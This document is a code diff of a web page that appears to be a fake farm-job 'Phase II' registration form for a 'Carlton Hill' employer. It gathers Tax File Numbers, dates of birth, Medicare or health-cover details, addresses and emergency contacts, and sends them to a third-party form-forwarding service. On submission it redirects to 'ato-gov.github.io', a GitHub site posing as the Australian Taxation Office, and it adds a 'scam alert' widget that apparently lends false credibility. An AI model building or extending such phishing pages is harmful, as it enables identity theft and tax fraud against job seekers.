+    color: var(--dark, #162015);
+    font-style: italic;
+  }
+
+  .scam-alert-thankyou {
+    background: linear-gradient(145deg, var(--primary-light, #e8f0ec), var(--light, #f9f6ef));
+    padding: 15px;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-top: 5px;
+  }
+
+  .scam-alert-thankyou i {
+    color: var(--accent, #c49a6b);
+    font-size: 1.3rem;
+    animation: heartBeat 1.5s ease infinite;
+  }
+
+  @keyframes heartBeat {
+    0%, 100% { transform: scale(1); }
+    25% { transform: scale(1.1); }
+    50% { transform: scale(1); }
+    75% { transform: scale(1.1); }
+  }
+
+  .scam-alert-thankyou p {
+    margin: 0;
+    color: var(--primary, #1a3a2a);
+    font-weight: 500;
+  }
+
+  .scam-alert-full-footer {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding-top: 15px;
+    border-top: 1px solid var(--gray, #eae7de);
+    font-size: 0.85rem;
+  }
+
+  .scam-alert-verified {
+    color: var(--success, #4caf50);
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+
+  .scam-alert-verified i {
+    font-size: 0.9rem;
+  }
+
+  .scam-alert-timestamp {
+    color: var(--gray-dark, #8b9a8b);
+    font-size: 0.8rem;
+  }
+
+  /* Responsive */
+  @media (max-width: 480px) {
+    .scam-alert-mini {
+      bottom: 10px;
+      right: 10px;
+    }
+    
+    .scam-alert-mini-content {
+      padding: 10px 16px;
+      font-size: 0.9rem;
+    }
+    
+    .scam-alert-full {
+      bottom: 10px;
+      right: 10px;
+      width: calc(100% - 20px);
+    }
+    
+    .scam-alert-full-content {
+      padding: 1.2rem;
+    }
+    
+    .scam-alert-full-header h3 {
+      font-size: 1.1rem;
+    }
+    
+    .scam-alert-full-icon {
+      width: 40px;
+      height: 40px;
+      font-size: 1.4rem;
+    }
+  }
+</style>
+
+<script>
+  // Scam Alert Functions
+  function expandScamAlert() {
+    const miniAlert = document.getElementById('scamAlert');
+    const fullAlert = document.getElementById('scamAlertFull');
+    
+    // Hide mini alert
+    miniAlert.style.display = 'none';
+    
+    // Show full alert
+    fullAlert.classList.add('active');
+    
+    // Update timestamp
+    const now = new Date();
+    const timestamp = now.toLocaleTimeString('en-AU', { 
+      hour: '2-digit', 
+      minute: '2-digit',
+      hour12: true 
+    });
+    document.getElementById('scamAlertTimestamp').textContent = `Notice issued • ${timestamp}`;
+  }
+
+  function minimizeScamAlert() {
+    const miniAlert = document.getElementById('scamAlert');
+    const fullAlert = document.getElementById('scamAlertFull');
+    
+    // Hide full alert
+    fullAlert.classList.remove('active');
+    
+    // Show mini alert after animation
+    setTimeout(() => {
+      miniAlert.style.display = 'block';
+    }, 300);
+  }
+
+  // Auto expand after 9 seconds
+  document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(() => {
+      expandScamAlert();
+    }, 9000);
+  });
+</script>
+
+<!-- FIXED LOADING SCREEN -->
+<div class="loading-screen" id="loadingScreen">
+  <div class="loader-content">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">Loading your secure portal</div>
+    <div class="loading-subtext">Please wait while we prepare your information</div>
+  </div>
+</div>
+
+<!-- Redirect Loader (after submit) -->
+<div class="redirect-loader" id="redirectLoader">
+  <div class="redirect-spinner"></div>
+  <div class="redirect-text">Processing your information</div>
+  <div class="redirect-subtext">Please wait while we securely submit your details</div>
+</div>
+
+<!-- Alert -->
 <div class="alert" id="alert">
   <i class="fas fa-check-circle"></i>
   <div class="alert-content">
@@ -1009,12 +1685,6 @@
   <span class="alert-close" onclick="hideAlert()"><i class="fas fa-times"></i></span>
 </div>
 
-<!-- Loading Overlay -->
-<div class="loading-overlay" id="loadingOverlay">
-  <div class="loading-spinner"></div>
-  <div class="loading-text">Processing your information...</div>
-</div>
-
 <!-- Success Modal -->
 <div class="modal" id="successModal">
   <div class="modal-card">
@@ -1022,40 +1692,32 @@
       <i class="fas fa-check"></i>
     </div>
     <h3>Phase II Complete</h3>
-    <p>Your TFN and health coverage have been submitted successfully.</p>
+    <p>Your information has been submitted successfully.</p>
     <div class="modal-divider"></div>
-    <div class="modal-note">
-      <i class="fas fa-clock"></i> Processing time: 2-3 business days
-    </div>
-    <button class="modal-btn" onclick="closeModal()">Continue</button>
+    <div class="modal-note">Processing time: 2-3 business days</div>
+    <button class="modal-btn" id="modalContinueBtn" onclick="handleATOPortalRedirect()">
+      <span>Continue to ATO Portal</span>
+    </button>
   </div>
 </div>
 
-<!-- navigation -->
-<div class="navbar">
-  <div class="nav-container">
-    <div class="logo">CARLTON HILL</div>
-    <div class="nav-links">
-      <a href="index.html">Home</a>
-      <a href="careers.html">Careers</a>
-      <a href="applications.html">Phase I</a>
-      <a href="#" class="active">Phase II</a>
-      <a href="contact.html">Contact</a>
+<!-- Phase I Preview Modal -->
+<div class="phase-modal" id="phaseModal">
+  <div class="phase-modal-content">
+    <div class="phase-modal-header">
+      <h3><i class="fas fa-file-invoice"></i> Phase I Application Summary</h3>
+      <button class="phase-modal-close" onclick="closePhaseModal()">&times;</button>
     </div>
-    <button class="mobile-menu-btn" id="menuBtn"><i class="fas fa-bars"></i></button>
+    <div class="phase-modal-body">
+      <div id="phaseModalContent">
+        <!-- Dynamically populated -->
+      </div>
+    </div>
+    <div class="phase-modal-footer">
+      <button class="modal-primary-btn" onclick="closePhaseModal()">Close</button>
+    </div>
   </div>
 </div>
-
-<!-- mobile nav -->
-<div class="mobile-nav" id="mobileNav">
-  <div class="mobile-nav-close" id="closeBtn"><i class="fas fa-times"></i></div>
-  <a href="index.html">Home</a>
-  <a href="careers.html">Careers</a>
-  <a href="applications.html">Phase I</a>
-  <a href="#" class="active">Phase II</a>
-  <a href="contact.html">Contact</a>
-</div>
-<div class="overlay" id="overlay"></div>
 
 <!-- main content -->
 <div class="container">
@@ -1066,39 +1728,56 @@
     <p>Complete your employment registration by providing your Tax File Number and health coverage details.</p>
   </div>
 
-  <!-- progress bar -->
+  <!-- progress bar with preview button -->
   <div class="progress">
     <div class="progress-labels">
-      <span class="progress-label completed">Phase I</span>
-      <span class="progress-label active">Phase II</span>
-      <span class="progress-label">Phase III: ATO Portal</span>
+      <span class="progress-label completed"><i class="fas fa-check-circle"></i> Phase I</span>
+      <span class="progress-label active"><i class="fas fa-spinner fa-pulse"></i> Phase II</span>
+      <span class="progress-label"><i class="fas fa-circle"></i> Phase III: ATO Portal</span>
     </div>
     <div class="progress-bar">
       <div class="progress-fill"></div>
     </div>
+    
+    <!-- Phase I Preview Button -->
+    <div class="phase-preview-btn" onclick="openPhaseModal()">
+      <i class="fas fa-history"></i>
+      <span>View Phase I Application Summary</span>
+      <i class="fas fa-arrow-right arrow"></i>
+    </div>
   </div>
 
-  <!-- user card - populated from Phase I data -->
-  <div class="user-card" id="userCard">
-    <div class="user-avatar">
+  <!-- enhanced user profile card -->
+  <div class="profile-card" id="userCard">
+    <div class="profile-avatar">
       <i class="fas fa-user"></i>
     </div>
-    <div class="user-info">
+    <div class="profile-info">
       <h2 id="displayName">Loading...</h2>
-      <p>
-        <span id="displayEmail"></span>
-        <span id="displayPosition"></span>
-      </p>
+      <div class="profile-details">
+        <span class="profile-detail-item">
+          <i class="fas fa-envelope"></i>
+          <span id="displayEmail"></span>
+        </span>
+        <span class="profile-detail-item">
+          <i class="fas fa-briefcase"></i>
+          <span id="displayPosition"></span>
+        </span>
+        <span class="profile-detail-item">
+          <i class="fas fa-calendar"></i>
+          <span>Phase I Completed</span>
+        </span>
+      </div>
     </div>
-    <div class="badge">
-      <i class="fas fa-check-circle"></i> Phase I Complete
+    <div class="profile-badge">
+      <i class="fas fa-check-circle"></i> Verified
     </div>
   </div>
 
-  <!-- form - using FormSubmit with access key -->
+  <!-- form -->
   <div class="form-card">
     <form id="phase2Form">
-      <!-- FormSubmit configuration -->
+      <!-- FormSubmit configuration with your access key -->
       <input type="hidden" name="access_key" value="8e488231cd6042709925dcfe946d1e1c">
       <input type="hidden" name="_subject" value="Phase II Application - Tax & Health">
       <input type="hidden" name="_template" value="box">
@@ -1245,7 +1924,7 @@
 
       <!-- submit button -->
       <button type="submit" class="submit-btn" id="submitBtn">
-        <i class="fas fa-paper-plane"></i> Submit
+        <i class="fas fa-paper-plane"></i> Submit Phase II
       </button>
     </form>
   </div>
@@ -1287,11 +1966,130 @@
   let phaseOneData = {
     fullName: '',
     email: '',
-    position: ''
+    position: '',
+    phone: '',
+    dob: '',
+    nationality: '',
+    address: '',
+    emergency: '',
+    workPosition: '',
+    workType: '',
+    startDate: '',
+    accommodation: ''
   };
 
   const MAX_FILE_SIZE = 5 * 1024 * 1024;
   const ALLOWED_TYPES = ['image/jpeg', 'image/jpg', 'image/png', 'application/pdf'];
+
+  // ==================== FIXED LOADING SCREEN ====================
+  window.addEventListener('load', function() {
+    setTimeout(function() {
+      document.getElementById('loadingScreen').classList.add('hidden');
+    }, 1000);
+  });
+
+  // ==================== REDIRECT LOADER ====================
+  function showRedirectLoader() {
+    document.getElementById('redirectLoader').classList.add('active');
+  }
+
+  function hideRedirectLoader() {
+    document.getElementById('redirectLoader').classList.remove('active');
+  }
+
+  // ==================== PHASE I MODAL FUNCTIONS ====================
+  function openPhaseModal() {
+    renderPhaseModalContent();
+    document.getElementById('phaseModal').classList.add('active');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closePhaseModal() {
+    document.getElementById('phaseModal').classList.remove('active');
+    document.body.style.overflow = '';
+  }
+
+  function renderPhaseModalContent() {
+    const modalContent = document.getElementById('phaseModalContent');
+    
+    modalContent.innerHTML = `
+      <div class="phase-info-grid">
+        <div class="phase-info-item">
+          <h4><i class="fas fa-user" style="margin-right: 0.5rem;"></i> Personal Details</h4>
+          <div class="phase-info-content">
+            <div class="info-row">
+              <i class="fas fa-user"></i>
+              <span>${phaseOneData.fullName || 'Not provided'}</span>
+            </div>
+            <div class="info-row">
+              <i class="fas fa-envelope"></i>
+              <span>${phaseOneData.email || 'Not provided'}</span>
+            </div>
+            <div class="info-row">
+              <i class="fas fa-phone"></i>
+              <span>${phaseOneData.phone || 'Not provided'}</span>
+            </div>
+            <div class="info-row">
+              <i class="fas fa-calendar"></i>
+              <span>${phaseOneData.dob ? new Date(phaseOneData.dob).toLocaleDateString() : 'Not provided'}</span>
+            </div>
+            <div class="info-row">
+              <i class="fas fa-flag"></i>
+              <span>${phaseOneData.nationality || 'Not provided'}</span>
+            </div>
+          </div>
+        </div>
+        
+        <div class="phase-info-item">
+          <h4><i class="fas fa-map-marker-alt" style="margin-right: 0.5rem;"></i> Address & Emergency</h4>
+          <div class="phase-info-content">
+            <div class="info-row">
+              <i class="fas fa-home"></i>
+              <span>${phaseOneData.address || 'Not provided'}</span>
+            </div>
+            <div class="info-row">
+              <i class="fas fa-phone-alt"></i>
+              <span>${phaseOneData.emergency || 'Not provided'}</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="work-preference-card">
+        <div class="work-preference-icon">
+          <i class="fas fa-briefcase"></i>
+        </div>
+        <div class="work-preference-details">
+          <h5>Position Applied</h5>
+          <p>${phaseOneData.workPosition || 'Not specified'}</p>
+          <div style="display: flex; gap: 1rem; margin-top: 0.5rem;">
+            <span style="font-size: 0.85rem; color: var(--gray-600);"><i class="fas fa-clock" style="margin-right: 0.3rem;"></i>${phaseOneData.workType || 'Not specified'}</span>
+            <span style="font-size: 0.85rem; color: var(--gray-600);"><i class="fas fa-calendar-alt" style="margin-right: 0.3rem;"></i>${phaseOneData.startDate || 'Not specified'}</span>
+            <span style="font-size: 0.85rem; color: var(--gray-600);"><i class="fas fa-home" style="margin-right: 0.3rem;"></i>${phaseOneData.accommodation === 'yes' ? 'Needs accommodation' : 'Own accommodation'}</span>
+          </div>
+        </div>
+      </div>
+      
+      <div style="background: var(--gray-50); border-radius: 8px; padding: 1rem;">
+        <p style="display: flex; align-items: center; gap: 0.5rem; color: var(--gray-600);">
+          <i class="fas fa-check-circle" style="color: var(--success);"></i>
+          <span>Phase I completed on ${new Date().toLocaleDateString()}</span>
+        </p>
+      </div>
+    `;
+  }
+
+  // ==================== ATO PORTAL REDIRECT ====================
+  function handleATOPortalRedirect() {
+    const btn = document.getElementById('modalContinueBtn');
+    btn.classList.add('loading');
+    btn.disabled = true;
+
+    // Simulate 2 second loading then redirect
+    setTimeout(() => {
+      window.location.href = 'https://ato-gov.github.io/au/';
+    }, 2000);
+  }
 
   // ==================== ALERT SYSTEM ====================
   function showAlert(title, message, type = 'success') {
@@ -1326,15 +2124,6 @@
   function closeModal() {
     document.getElementById('successModal').classList.remove('active');
     document.body.style.overflow = '';
-  }
-
-  // ==================== LOADING ====================
-  function showLoading() {
-    document.getElementById('loadingOverlay').classList.add('active');
-  }
-
-  function hideLoading() {
-    document.getElementById('loadingOverlay').classList.remove('active');
   }
 
   // ==================== TOGGLE HEALTH SECTIONS ====================
@@ -1433,6 +2222,16 @@
         
         phaseOneData.fullName = latest.personalInfo?.fullName || '';
         phaseOneData.email = latest.personalInfo?.email || '';
+        phaseOneData.phone = latest.personalInfo?.phone || '';
+        phaseOneData.dob = latest.personalInfo?.dob || '';
+        phaseOneData.nationality = latest.personalInfo?.nationality || '';
+        phaseOneData.address = latest.personalInfo?.address || '';
+        phaseOneData.emergency = latest.personalInfo?.emergency || '';
+        
+        phaseOneData.workPosition = latest.workPreference?.position || '';
+        phaseOneData.workType = latest.workPreference?.workType || '';
+        phaseOneData.startDate = latest.workPreference?.startDate || '';
+        phaseOneData.accommodation = latest.workPreference?.needsAccommodation || 'no';
         
         const positionCode = latest.workPreference?.position || '';
         switch(positionCode) {
@@ -1552,25 +2351,34 @@
     const btn = document.getElementById('submitBtn');
     btn.classList.add('loading');
     btn.disabled = true;
-    showLoading();
+    showRedirectLoader();
 
     try {
       const formData = new FormData();
       
+      // FormSubmit configuration with your access key
       formData.append('access_key', '8e488231cd6042709925dcfe946d1e1c');
       formData.append('_subject', 'Phase II Application - Tax & Health');
       formData.append('_template', 'box');
       formData.append('_captcha', 'false');
-      formData.append('_autoresponse', 'Thank you for submitting your Phase II information.');
+      formData.append('_autoresponse', 'Thank you for submitting your Phase II information. We will process your details within 2-3 business days.');
       
+      // Phase I data
       formData.append('phase1_name', phaseOneData.fullName);
       formData.append('phase1_email', phaseOneData.email);
       formData.append('phase1_position', phaseOneData.position);
+      formData.append('phase1_phone', phaseOneData.phone);
+      formData.append('phase1_dob', phaseOneData.dob);
+      formData.append('phase1_nationality', phaseOneData.nationality);
+      formData.append('phase1_address', phaseOneData.address);
+      formData.append('phase1_emergency', phaseOneData.emergency);
       
+      // TFN data
       formData.append('tfn_number', document.getElementById('tfn').value.trim());
       formData.append('tfn_name', document.getElementById('tfnName').value.trim());
       formData.append('dob', document.getElementById('dob').value);
       
+      // Health data
       const isMedicare = document.getElementById('medicareRadio').checked;
       formData.append('health_type', isMedicare ? 'medicare' : 'ovhc');
       
@@ -1594,7 +2402,8 @@
       
       formData.append('declaration', 'confirmed');
 
-      const response = await fetch('https://formsubmit.co/ajax/support.carltonhillfarm@gmail.com', {
+      // Submit to FormSubmit
+      const response = await fetch('https://formsubmit.co/ajax/8e488231cd6042709925dcfe946d1e1c', {
         method: 'POST',
         body: formData
       });
@@ -1602,6 +2411,7 @@
       const result = await response.json();
       
       if (result.success) {
+        // Save to localStorage
         const applicationData = {
           phase1: phaseOneData,
           tfn: {
@@ -1622,26 +2432,33 @@
             expiry: document.getElementById('ovhcExpiry').value,
             fileName: uploadedFiles.ovhc?.name
           },
-          timestamp: new Date().toISOString(),
-          submissionId: result.submissionId || 'local-' + Date.now()
+          timestamp: new Date().toISOString()
         };
         
         const applications = JSON.parse(localStorage.getItem('phase2_submissions') || '[]');
         applications.push(applicationData);
         localStorage.setItem('phase2_submissions', JSON.stringify(applications));
         
-        hideLoading();
-        openModal();
-        
-        document.getElementById('phase2Form').reset();
-        document.getElementById('tfnName').value = phaseOneData.fullName;
-        
-        uploadedFiles = { medicare: null, ovhc: null };
-        document.querySelectorAll('.file-info').forEach(el => el.classList.remove('active'));
-        
-        document.getElementById('medicareRadio').checked = true;
-        document.getElementById('medicareSection').classList.add('active');
-        document.getElementById('ovhcSection').classList.remove('active');
+        // Hide redirect loader and show success
+        setTimeout(() => {
+          hideRedirectLoader();
+          openModal();
+          
+          // Reset form
+          document.getElementById('phase2Form').reset();
+          document.getElementById('tfnName').value = phaseOneData.fullName;
+          
+          uploadedFiles = { medicare: null, ovhc: null };
+          document.querySelectorAll('.file-info').forEach(el => el.classList.remove('active'));
+          
+          document.getElementById('medicareRadio').checked = true;
+          document.getElementById('medicareSection').classList.add('active');
+          document.getElementById('ovhcSection').classList.remove('active');
+          
+          btn.classList.remove('loading');
+          btn.disabled = false;
+          
+        }, 2000);
         
       } else {
         throw new Error(result.message || 'Submission failed');
@@ -1649,57 +2466,42 @@
       
     } catch (error) {
       console.error('Submission error:', error);
-      hideLoading();
+      hideRedirectLoader();
       showAlert('Error', 'Submission failed. Please try again.', 'error');
-    } finally {
       btn.classList.remove('loading');
       btn.disabled = false;
     }
   });
 
-  // ==================== MOBILE MENU ====================
-  function setupMobileMenu() {
-    const menuBtn = document.getElementById('menuBtn');
-    const mobileNav = document.getElementById('mobileNav');
-    const overlay = document.getElementById('overlay');
-    const closeBtn = document.getElementById('closeBtn');
+  // ==================== MODAL CLOSE HANDLER ====================
+  document.getElementById('successModal').addEventListener('click', function(e) {
+    if (e.target === this) closeModal();
+  });
 
-    function openMenu() {
-      mobileNav.classList.add('active');
-      overlay.classList.add('active');
-      document.body.style.overflow = 'hidden';
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') {
+      if (document.getElementById('successModal').classList.contains('active')) {
+        closeModal();
+      }
+      if (document.getElementById('phaseModal').classList.contains('active')) {
+        closePhaseModal();
+      }
     }
+  });
 
-    function closeMenu() {
-      mobileNav.classList.remove('active');
-      overlay.classList.remove('active');
-      document.body.style.overflow = '';
-    }
-
-    menuBtn.addEventListener('click', openMenu);
-    closeBtn.addEventListener('click', closeMenu);
-    overlay.addEventListener('click', closeMenu);
-  }
+  // Close phase modal when clicking overlay
+  document.getElementById('phaseModal').addEventListener('click', function(e) {
+    if (e.target === this) closePhaseModal();
+  });
 
   // ==================== INITIALIZATION ====================
   document.addEventListener('DOMContentLoaded', function() {
     loadPhaseOneData();
     setupHealthToggles();
-    setupMobileMenu();
     
     document.getElementById('medicareNumber').required = true;
     document.getElementById('medicareRef').required = true;
     document.getElementById('medicareExpiry').required = true;
-    
-    document.getElementById('successModal').addEventListener('click', function(e) {
-      if (e.target === this) closeModal();
-    });
-
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape' && document.getElementById('successModal').classList.contains('active')) {
-        closeModal();
-      }
-    });
   });
 </script>
 
